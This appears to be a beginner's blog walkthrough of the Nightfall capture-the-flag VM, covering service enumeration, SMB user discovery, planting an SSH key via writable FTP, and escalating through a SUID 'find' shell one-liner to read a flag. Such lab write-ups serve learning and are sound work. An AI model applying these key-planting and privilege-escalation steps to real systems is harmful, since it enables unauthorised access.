<pre><code>Nightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge.

</code></pre><p>That&rsquo;s a lot of services! FTP, SSH, Apache HTTP Server, something called &ldquo;Samba&rdquo; (I&rsquo;d not heard of this service before now) and MySQL. I started with port 80, opening up Firefox to see if anything interesting was running.</p>

<p>It looks like it&rsquo;s a default Apache HTTP Server install. I ran <code>dirb</code> against 10.0.2.19 (the IP for Nightfall) with the default word list to make sure there weren&rsquo;t any interesting endpoints hiding but this didn&rsquo;t return anything useful:</p>

</code></pre><p>Next, I took a look at the FTP server. I tried to log in as an anonymous user but no luck:</p>

</code></pre><p>What was curious was that the FTP server wasn&rsquo;t vsftpd (what I&rsquo;ve usually seen in the past), it was something called &ldquo;pyftpdlib&rdquo;. I looked into pyftpdlib and found the GitHub repo which states: &ldquo;Python FTP Server library is a FTP server library providing a portable interface to easily write very efficient asynchronous FTP servers with Python.&rdquo;</p>
<p>I took a look at the releases, as nmap was reporting the version of pyftpdlib to be 1.5:</p>
<p><img src="/static/sunrise-nightfall/2.png" alt=""></p>
<p>It&rsquo;s a few versions out of date so I checked in the GitHub issues and on Exploit DB to see if any exploits had been raised against pyftpdlib but nothing came up.</p>
<p>To be honest, that&rsquo;s where the story ends for a few days. I was a little overwhelmed by the number of services (still being fairly new to the CTF scene) that could be enumerated and I found myself constantly flipping between services trying to find a way in without a steady aim or trajectory. I took some time away from Nightfall for a bit and given I knew the least about Samba and SMB, that&rsquo;s where I started my research. <a href="https://www.samba.org/samba/what_is_samba.html">The Samba website</a> states: &ldquo;Samba is the standard Windows interoperability suite of programs for Linux and Unix. Since 1992, Samba has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others.&rdquo;</p>
<p><a href="https://techterms.com/definition/smb">This particular definition of SMB</a> made the most sense to me: &ldquo;SMB is a network protocol used by Windows-based computers that allows systems within the same network to share files. It allows computers connected to the same network or domain to access files from other local computers as easily as if they were on the computer&rsquo;s local hard drive. Not only does SMB allow computers to share files, but it also enables computers to share printers and even serial ports from other computers within the network. For example, a computer connected to a Windows network could print a document on a printer connected to another computer on the network, as long as both machines support the SMB protocol.&rdquo;</p>
<p>After reading a few more articles and skimming several RFCs I had a basic understanding of what Samba and SMB were. Now I wanted to know how to start interacting with a Samba server. As predicted <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec</a> has a <a href="https://www.youtube.com/watch?v=jUc1J31DNdw">great walkthrough</a> of HackTheBox: Active in which they demonstrate how to use different tools to interrogate Samba/SMB.</p>
<p>Running <a href="https://tools.kali.org/information-gathering/smbmap">SMBMap</a> didn&rsquo;t return anything interesting:</p>
<pre><code>kali@kali:~$ smbmap -H 10.0.2.19

</code></pre><p>Running <a href="https://tools.kali.org/information-gathering/enum4linux">enum4linux</a> however, did return something interesting. This tool outputs a lot of information so I&rsquo;ve stripped out the noise leaving just the interesting lines:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ enum4linux -a 10.0.2.19

S-1-22-1-1001 Unix User\matt (Local User)
...
...
</code></pre><p>I was interested in how enum4linux found these users so that I might understand a bit more on how Samba and SMB work, but within minutes I was down a rabbit hole, reading about the difference between RIDs and a SIDs in Active Directory and RID cycling attacks using null sessions. Given that I had a username to start enumerating the other services with and my knowledge of Windows is minimal, I didn&rsquo;t fancy losing my mind with the exact details at this point so I left the <em>fascinating</em> world of Samba/Windows/Active Directory/SID/RID for now, with a todo on my list to spend more time understanding this technology soon.</p>

</code></pre><p>The first thing I noticed was the <code>.gnupg</code> directory but unfortunately I didn&rsquo;t find anything exciting in it. Changing directories outside of <code>matt</code>&rsquo;s home directory wasn&rsquo;t permitted. I was stuck in the home directory <em>but</em> I had read/write permissions. I also knew the box had SSH access so the plan was to exploit that.</p>

</code></pre><p>I created a passwordless keypair on my machine. Once I had the authorized_keys file created (which was just a copy of the ssh public key) I created a <code>.ssh</code> directory in <code>matt</code>&rsquo;s home directory and uploaded the authorized_keys file:</p>
<pre><code>ftp&gt; mkdir .ssh
257 &quot;/.ssh&quot; directory created. 
ftp&gt; cd .ssh
250 &quot;/.ssh&quot; is the current directory.

</code></pre><p>I opened up a new terminal and ssh&rsquo;d in as <code>matt</code>, using the private key as the identity file:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ ssh matt@10.0.2.19 -i ssh
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

matt@nightfall:~$ 
</code></pre><p>Once I was logged in as <code>matt</code> I downloaded a copy of <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a> from my machine (10.0.2.15) and ran it as <code>matt</code>:</p>
<pre><code>matt@nightfall:~$ wget http://10.0.2.15:8000/LinEnum.sh
...
...
2020-02-15 10:49:45 (23.4 MB/s) - ‘LinEnum.sh’ saved [46631/46631]
</code></pre><p>Again, like <code>enum4linux</code>, LinEnum outputs a lot of information, but the interesting bit in all of the noise was here:</p>
<pre><code>matt@nightfall:~$ ./LinEnum.sh
...
...
[+] Possibly interesting SUID files:
-rwsr-sr-x 1 nightfall nightfall 315904 Aug 28 14:31 /scripts/find
...
...
</code></pre><p>This copy of <code>find</code> runs as user <code>nightfall</code> due to the SUID permission on the file. <code>find</code> can execute shell commands (using the <code>-exec</code> flag) and <a href="https://gtfobins.github.io/gtfobins/find/">GTFOBins</a> documents a nice one-liner to get a shell via find.</p>
<pre><code>matt@nightfall:~$ cd /scripts
matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
$ whoami
nightfall
$ cd /home/nightfall
$ ls
user.txt
$ cat user.txt
97fb7140ca325ed96f67be3c9e30083d
</code></pre><p>The first flag was found. To get around having to pivot through <code>matt</code> to user <code>nightfall</code> (and to also get a better shell) I decided to set up ssh the same way I did for <code>matt</code>:</p>
<pre><code>$ mkdir .ssh
$ cd .ssh
$ cp /home/matt/.ssh/authorized_keys authorized_keys
</code></pre><p>Once the authorized_keys were in place I could ssh in as <code>nightfall</code>.</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ ssh nightfall@10.0.2.19 -i ssh

nightfall@nightfall:~$

<p>This was the first time I&rsquo;d come face to face with Samba and SMB. I have a lot to learn about Windows (ugh) and some of the common services found running on Windows (ugh) but I&rsquo;m happy the gaps in my knowledge didn&rsquo;t stop me from completing this box. Nightfall was an interesting challenge that forced me to step away for a few days, do my research, and come back with a plan.</p>
